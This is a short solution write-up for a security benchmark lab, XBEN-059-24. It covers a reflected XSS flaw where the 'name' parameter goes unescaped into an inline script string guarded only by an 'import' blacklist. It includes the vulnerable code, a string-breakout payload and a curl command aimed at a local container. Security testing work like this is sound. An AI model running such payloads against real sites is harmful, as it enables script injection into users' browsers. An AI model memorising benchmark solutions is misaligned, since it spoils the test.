# XBEN-059-24 - Cross 6

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** Reflected XSS into an inline `<script>` JS string literal
(`src/app.py`, route `xss6`):

```python
blacklist = ['import']
script_content = """<div class="solution-text"><script> var name = "%s"; document.write('Hello ' + name); </script></div>""" % msg
```

The only filter is the literal word `import`. `msg` (the `name` GET param) is placed
unescaped inside a double-quoted JS string. Breaking out of the string with `";` lets us
inject arbitrary JS statements directly in the `<script>` block.

Payload: `name="; alert('XSS'); var x="`

## Setup

```bash
cd xbow/benchmarks/XBEN-059-24
make run
docker compose port web 5000   # -> 0.0.0.0:<PORT>
```

## Exploit

```bash
PORT=<PORT>   # e.g. 63465
curl -s -G "http://localhost:$PORT/page" --data-urlencode "name=\"; alert('XSS'); var x=\""
```
